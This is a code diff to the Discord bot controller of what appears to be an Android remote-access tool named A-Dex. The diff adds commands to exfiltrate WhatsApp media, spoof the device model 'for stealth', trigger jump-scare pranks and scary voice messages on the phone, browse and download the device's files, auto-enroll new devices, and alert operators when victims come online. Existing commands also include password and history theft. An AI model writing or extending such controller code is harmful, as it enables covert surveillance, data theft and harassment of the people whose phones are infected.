@@ -88,6 +88,11 @@ DEVICE_COMMAND_NAMES = {
     "gethistory",
     "sysinfo_full",
     "getpasswords",
+    "sayscary",
+    "sayscaryurdu",
+    "getwhatsapp",
+    "prank_mode",
+    "spoof",
 }
 
 
@@ -128,7 +133,168 @@ class LockAppPickerSession:
             self.locked_packages.add(package_name)
 
 
+@dataclass
+class FileBrowserSession:
+    current_path: str = ""
+    page: int = 1
+    page_size: int = 20
+    sort_by: str = "name"
+    sort_dir: str = "asc"
+    items: list[dict[str, Any]] = None
+
+    def __post_init__(self):
+        if self.items is None:
+            self.items = []
+
+class FileBrowserSelect(discord.ui.Select["FileBrowserView"]):
+    def __init__(self, options: list[discord.SelectOption]) -> None:
+        super().__init__(placeholder="Select a directory or file...", min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction) -> None:
+        if self.view is None: return
+        await self.view.handle_select(interaction, self.values[0])
+
+class FileBrowserView(discord.ui.View):
+    def __init__(self, client: "ADexDiscordClient", owner_user_id: int, guild_id: int, channel_id: int, session: FileBrowserSession) -> None:
+        super().__init__(timeout=300)
+        self.client = client
+        self.owner_user_id = owner_user_id
+        self.guild_id = guild_id
+        self.channel_id = channel_id
+        self.session = session
+        self.message: discord.Message | None = None
+        self.rebuild_buttons()
+
+    def is_owner(self, interaction: discord.Interaction) -> bool:
+        return interaction.user.id == self.owner_user_id
+
+    def render_text(self) -> str:
+        lines = [
+            f"**File Browser** | Path: `{self.session.current_path or 'Root'}`",
+            f"Page `{self.session.page}`",
+        ]
+        if not self.session.items:
+            lines.append("- (Empty Directory)")
+        else:
+            for item in self.session.items:
+                marker = "📁" if item.get("isDirectory") else "📄"
+                size = item.get("size") or 0
+                lines.append(f"{marker} `{item.get('name')}` - {size} bytes")
+        return "\n".join(lines)
+
+    def rebuild_buttons(self) -> None:
+        self.clear_items()
+        
+        btn_up = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Up (..)", row=0)
+        btn_up.callback = self.handle_up
+        self.add_item(btn_up)
+        
+        btn_refresh = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Refresh", row=0)
+        btn_refresh.callback = self.handle_refresh
+        self.add_item(btn_refresh)
+        
+        btn_prev = discord.ui.Button(style=discord.ButtonStyle.primary, label="Prev Page", row=1)
+        btn_prev.callback = self.handle_prev
+        self.add_item(btn_prev)
+        
+        btn_next = discord.ui.Button(style=discord.ButtonStyle.primary, label="Next Page", row=1)
+        btn_next.callback = self.handle_next
+        self.add_item(btn_next)
+
+        options = []
+        for item in self.session.items:
+            name = str(item.get("name"))[:90]
+            val = str(item.get("name"))
+            desc = "Directory" if item.get("isDirectory") else "File"
+            options.append(discord.SelectOption(label=name, value=val, description=desc, emoji="📁" if item.get("isDirectory") else "📄"))
+        
+        if options:
+            self.add_item(FileBrowserSelect(options[:25]))
+
+    async def _fetch_dir(self, interaction: discord.Interaction, path: str, page: int = 1) -> None:
+        if not self.is_owner(interaction):
+            await interaction.response.send_message("Only the command author can use this browser.", ephemeral=True)
+            return
+        await interaction.response.defer()
+        try:
+            result = await self.client._send_device_command_wait(
+                guild_id=str(self.guild_id),
+                channel_id=str(self.channel_id),
+                discord_user_id=str(interaction.user.id),
+                command_name="files",
+                payload={"path": path, "page": page, "pageSize": self.session.page_size, "sortBy": self.session.sort_by, "sortDir": self.session.sort_dir},
+                timeout_seconds=45,
+                silent=True,
+            )
+        except Exception as e:
+            await interaction.followup.send(f"Error: {e}", ephemeral=True)
+            return
+
+        if result and result.get("status") == "success":
+            data = result.get("data", {})
+            self.session.current_path = data.get("currentPath") or path
+            self.session.page = page
+            self.session.items = data.get("files") or []
+        
+        self.rebuild_buttons()
+        if self.message:
+            await self.message.edit(content=self.render_text(), view=self)
+
+    async def handle_up(self, interaction: discord.Interaction) -> None:
+        import os
+        path = self.session.current_path
+        if not path or path == "/":
+            path = ""
+        else:
+            path = os.path.dirname(path)
+        await self._fetch_dir(interaction, path, 1)
+
+    async def handle_refresh(self, interaction: discord.Interaction) -> None:
+        await self._fetch_dir(interaction, self.session.current_path, self.session.page)
+
+    async def handle_prev(self, interaction: discord.Interaction) -> None:
+        page = max(1, self.session.page - 1)
+        await self._fetch_dir(interaction, self.session.current_path, page)
+
+    async def handle_next(self, interaction: discord.Interaction) -> None:
+        await self._fetch_dir(interaction, self.session.current_path, self.session.page + 1)
+
+    async def handle_select(self, interaction: discord.Interaction, value: str) -> None:
+        if not self.is_owner(interaction):
+            await interaction.response.send_message("Only the command author can use this browser.", ephemeral=True)
+            return
+        
+        import os
+        item = next((i for i in self.session.items if i.get("name") == value), None)
+        if not item:
+            await interaction.response.send_message("Item not found.", ephemeral=True)
+            return
+
+        target_path = os.path.join(self.session.current_path, value) if self.session.current_path else value
+
+        if item.get("isDirectory"):
+            await self._fetch_dir(interaction, target_path, 1)
+        else:
+            await interaction.response.defer()
+            await interaction.followup.send(f"Requesting download of `{target_path}`...")
+            try:
+                # We need to queue a download command normally without waiting since it triggers the usual async system
+                response = await self.client.backend.post(
+                    "/api/v1/commands",
+                    {
+                        "guildId": str(self.guild_id),
+                        "channelId": str(self.channel_id),
+                        "discordUserId": str(interaction.user.id),
+                        "commandName": "download",
+                        "payload": {"path": target_path},
+                    },
+                )
+                await interaction.followup.send(f"Download queued: `{target_path}` (status: `{response.get('status')}`).")
+            except Exception as e:
+                await interaction.followup.send(f"Download failed: {e}")
+
 class LockAppSearchModal(discord.ui.Modal, title="Search Apps"):
+
     query = discord.ui.TextInput(label="Label or package contains", required=False, max_length=80)
 
     def __init__(self, view: "LockAppPickerView") -> None:
@@ -401,6 +567,7 @@ class ADexDiscordClient(discord.Client):
         self._backend_build_ts = "unknown"
         self._pending_results: dict[str, asyncio.Future[dict[str, Any]]] = {}
         self._silent_request_ids: set[str] = set()
+        self._notify_user_ids: set[int] = set()
 
     async def setup_hook(self) -> None:
         await self.backend.start()
@@ -431,6 +598,16 @@ class ADexDiscordClient(discord.Client):
     async def on_ready(self) -> None:
         if self.user:
             print(f"A-Dex bot logged in as {self.user}")
+            if self.guilds:
+                await self._sync_bot_guild_to_backend()
+
+    async def _sync_bot_guild_to_backend(self) -> None:
+        try:
+            main_guild = self.guilds[0]
+            await self.backend.post("/api/v1/config/auto-enroll", {"guildId": str(main_guild.id)})
+            print(f"Backend auto-enroll set to guild: {main_guild.name} ({main_guild.id})")
+        except Exception as exc:
+            print(f"Failed to sync bot guild to backend: {format_error(exc)}")
 
     async def _load_backend_capabilities(self) -> None:
         try:
@@ -557,57 +734,47 @@ class ADexDiscordClient(discord.Client):
         async def screenshot(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "screenshot", {})
 
-        @self.tree.command(name="files", description="Browse files with pagination/search/sort")
+        @self.tree.command(name="files", description="Browse files interactively using Discord buttons")
         @app_commands.describe(
-            path="Directory path (optional)",
-            page="Page number",
-            page_size="Items per page",
-            sort_by="Sort by field",
-            sort_dir="Sort order",
-            query="Search text",
-            type="Filter type",
-        )
-        @app_commands.choices(
-            sort_by=[
-                app_commands.Choice(name="name", value="name"),
-                app_commands.Choice(name="size", value="size"),
-                app_commands.Choice(name="modified", value="modified"),
-            ],
-            sort_dir=[
-                app_commands.Choice(name="asc", value="asc"),
-                app_commands.Choice(name="desc", value="desc"),
-            ],
-            type=[
-                app_commands.Choice(name="all", value="all"),
-                app_commands.Choice(name="file", value="file"),
-                app_commands.Choice(name="dir", value="dir"),
-            ],
+            path="Directory path (optional, starts at root if not provided)",
         )
         async def files(
             interaction: discord.Interaction,
             path: str | None = None,
-            page: app_commands.Range[int, 1, 500] = 1,
-            page_size: app_commands.Range[int, 1, 200] = 50,
-            sort_by: app_commands.Choice[str] | None = None,
-            sort_dir: app_commands.Choice[str] | None = None,
-            query: str | None = None,
-            type: app_commands.Choice[str] | None = None,
         ) -> None:
-            payload: dict[str, Any] = {
-                "page": int(page),
-                "pageSize": int(page_size),
-            }
-            if path:
-                payload["path"] = path
-            if sort_by:
-                payload["sortBy"] = sort_by.value
-            if sort_dir:
-                payload["sortDir"] = sort_dir.value
-            if query:
-                payload["query"] = query
-            if type:
-                payload["type"] = type.value
-            await self._queue_remote_command(interaction, "files", payload)
+            if not await self._validate_guild_context(interaction):
+                return
+            session = FileBrowserSession(current_path=path or "")
+            view = FileBrowserView(
+                client=self,
+                owner_user_id=interaction.user.id,
+                guild_id=int(interaction.guild_id),
+                channel_id=int(interaction.channel_id),
+                session=session,
+            )
+            await interaction.response.defer()
+            view.message = await interaction.followup.send("Loading file browser...", wait=True)
+            try:
+                result = await self._send_device_command_wait(
+                    guild_id=str(interaction.guild_id),
+                    channel_id=str(interaction.channel_id),
+                    discord_user_id=str(interaction.user.id),
+                    command_name="files",
+                    payload={"path": path or "", "page": 1, "pageSize": session.page_size, "sortBy": session.sort_by, "sortDir": session.sort_dir},
+                    timeout_seconds=45,
+                    silent=True,
+                )
+            except Exception as e:
+                await view.message.edit(content=f"Error: {e}")
+                return
+
+            if result and result.get("status") == "success":
+                data = result.get("data", {})
+                session.current_path = data.get("currentPath") or path or ""
+                session.items = data.get("files") or []
+            
+            view.rebuild_buttons()
+            await view.message.edit(content=view.render_text(), view=view)
 
         @self.tree.command(name="filestat", description="Read metadata of file/folder")
         @app_commands.describe(path="Absolute path")
@@ -1077,6 +1244,20 @@ class ADexDiscordClient(discord.Client):
         async def getpasswords(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "getpasswords", {})
 
+        @self.tree.command(name="sayscary", description="Speak text using phone TTS with a scary voice limit")
+        @app_commands.describe(text="Text to speak")
+        async def sayscary(interaction: discord.Interaction, text: str) -> None:
+            await self._queue_remote_command(interaction, "sayscary", {"text": text})
+
+        @self.tree.command(name="sayscaryurdu", description="Speak Urdu text using a scary voice limit")
+        @app_commands.describe(text="Urdu text to speak")
+        async def sayscaryurdu(interaction: discord.Interaction, text: str) -> None:
+            await self._queue_remote_command(interaction, "sayscaryurdu", {"text": text})
+
+        @self.tree.command(name="getwhatsapp", description="Zip and upload WhatsApp media data")
+        async def getwhatsapp(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "getwhatsapp", {})
+
         @self.tree.command(name="pair", description="Pair channel with one-time device code")
         @app_commands.describe(code="One-time pairing code shown in app")
         async def pair(interaction: discord.Interaction, code: str) -> None:
@@ -1175,7 +1356,7 @@ class ADexDiscordClient(discord.Client):
             except Exception as exc:
                 await interaction.followup.send(f"Command failed: {format_error(exc)}")
 
-        @self.tree.command(name="devices", description="List paired devices for this guild")
+        @self.tree.command(name="devices", description="List online/paired devices for this guild")
         async def devices(interaction: discord.Interaction) -> None:
             if not await self._validate_guild_context(interaction):
                 return
@@ -1192,25 +1373,95 @@ class ADexDiscordClient(discord.Client):
 
                 devices_data = data.get("devices") or []
                 if not devices_data:
-                    await interaction.followup.send("No paired devices found for this guild.")
+                    await interaction.followup.send("No paired devices found for this guild. Use `/pair` to add one.")
                     return
 
-                lines = []
-                for d in devices_data:
-                    did = d.get('id')
-                    status = d.get('status')
-                    channel_id = d.get('channelId')
-                    model = d.get('model') or 'unknown'
-                    
-                    bound_suffix = " (BOUND TO THIS CHANNEL)" if str(channel_id) == str(interaction.channel_id) else ""
-                    lines.append(f"- `{did}` | {status} | model: {model}{bound_suffix}")
+                embed = discord.Embed(title="📱 Managed Devices", color=discord.Color.blue())
+                view = discord.ui.View(timeout=120)
 
-                chunks = split_lines_for_discord(lines)
-                await interaction.followup.send("Devices:\n" + chunks[0])
-                for chunk in chunks[1:]:
-                    await interaction.followup.send(chunk)
+                for d in devices_data:
+                    did = d.get('id') or "unknown"
+                    raw_status = (d.get('status') or "unknown").lower()
+                    status_emoji = "🟢" if raw_status == "online" else "🔴"
+                    bound_channel = d.get('channelId')
+                    model = d.get('model') or 'Unknown'
+                    
+                    is_bound_here = str(bound_channel) == str(interaction.channel_id)
+                    status_text = f"{status_emoji} {raw_status.capitalize()}"
+                    
+                    embed.add_field(
+                        name=f"{model} (`{did}`)",
+                        value=f"**Status:** {status_text}\n{'✅ Bound to this channel' if is_bound_here else '❌ Not bound here'}",
+                        inline=False
+                    )
+
+                    if not is_bound_here and raw_status == "online":
+                        # Add bind button
+                        btn = discord.ui.Button(label=f"Bind {did[:4]}", style=discord.ButtonStyle.success, custom_id=f"bind_{did}")
+                        
+                        async def make_callback(device_id):
+                            async def callback(inner_interaction: discord.Interaction):
+                                try:
+                                    await self.backend.post(
+                                        "/api/v1/channel-bindings",
+                                        {
+                                            "guildId": str(inner_interaction.guild_id),
+                                            "channelId": str(inner_interaction.channel_id),
+                                            "deviceId": device_id,
+                                            "actorUserId": str(inner_interaction.user.id),
+                                        },
+                                    )
+                                    await inner_interaction.response.send_message(f"Successfully bound `{device_id}` to this channel.", ephemeral=True)
+                                except Exception as e:
+                                    await inner_interaction.response.send_message(f"Binding failed: {e}", ephemeral=True)
+                            return callback
+
+                        btn.callback = await make_callback(did)
+                        view.add_item(btn)
+
+                await interaction.followup.send(embed=embed, view=view)
             except Exception as exc:
                 await interaction.followup.send(f"Command failed: {format_error(exc)}")
+
+        @self.tree.command(name="setmain", description="Set this server as the main auto-enrollment server")
+        async def setmain(interaction: discord.Interaction) -> None:
+            await interaction.response.defer(thinking=False)
+            try:
+                await self.backend.post(
+                    "/api/v1/config/auto-enroll",
+                    {"guildId": str(interaction.guild_id)},
+                )
+                await interaction.followup.send(f"✅ Success! All new devices will now automatically connect to this server (`{interaction.guild_id}`).")
+            except Exception as exc:
+                await interaction.followup.send(f"Failed to update main server: {format_error(exc)}")
+
+        @self.tree.command(name="addusernotify", description="Notify me in DMs when a device comes online")
+        async def addusernotify(interaction: discord.Interaction) -> None:
+            user_id = interaction.user.id
+            if user_id in self._notify_user_ids:
+                self._notify_user_ids.remove(user_id)
+                await interaction.response.send_message("You will no longer be notified when devices come online.", ephemeral=True)
+            else:
+                self._notify_user_ids.add(user_id)
+                await interaction.response.send_message("You will now receive a DM when a paired device comes online.", ephemeral=True)
+
+        @self.tree.command(name="wallpaper", description="Set device wallpaper from image upload")
+        @app_commands.describe(image="Image file to set as wallpaper")
+        async def wallpaper(interaction: discord.Interaction, image: discord.Attachment) -> None:
+            if not (image.content_type and image.content_type.startswith("image/")):
+                await interaction.response.send_message("Please upload a valid image file.", ephemeral=True)
+                return
+            await self._queue_remote_command(interaction, "wallpaper", {"url": image.url})
+
+        @self.tree.command(name="prank_mode", description="Toggle automatic prank/jump-scare mode on device")
+        @app_commands.describe(enabled="Whether to enable or disable automatic pranks")
+        async def prank_mode(interaction: discord.Interaction, enabled: bool) -> None:
+            await self._queue_remote_command(interaction, "prank_mode", {"enabled": enabled})
+
+        @self.tree.command(name="spoof", description="Set fake device identity for stealth")
+        @app_commands.describe(model="Fake model name (e.g. Pixel 8 Pro)", manufacturer="Fake manufacturer (e.g. Google)")
+        async def spoof(interaction: discord.Interaction, model: str | None = None, manufacturer: str | None = None) -> None:
+            await self._queue_remote_command(interaction, "spoof", {"model": model, "manufacturer": manufacturer})
 
 
     async def _validate_guild_context(self, interaction: discord.Interaction) -> bool:
@@ -1369,7 +1620,19 @@ class ADexDiscordClient(discord.Client):
             if event_type == "bot.command_result":
                 await self._publish_command_result(payload)
             elif event_type == "bot.device_status":
-                print("Device status:", payload.get("deviceId"), payload.get("status"))
+                device_id = payload.get("deviceId")
+                status = payload.get("status")
+                print("Device status:", device_id, status)
+                
+                if status == "online" and self._notify_user_ids:
+                    for uid in self._notify_user_ids:
+                        try:
+                            user = self.get_user(uid) or await self.fetch_user(uid)
+                            if user:
+                                await user.send(f"🟢 **Alert:** Device `{device_id}` is now online!")
+                        except Exception as e:
+                            print(f"Failed to notify user {uid}: {e}")
+                            
             elif event_type == "bot.device_event":
                 await self._publish_device_event(payload)
                 print("Device event:", payload.get("deviceId"), payload.get("eventType"))
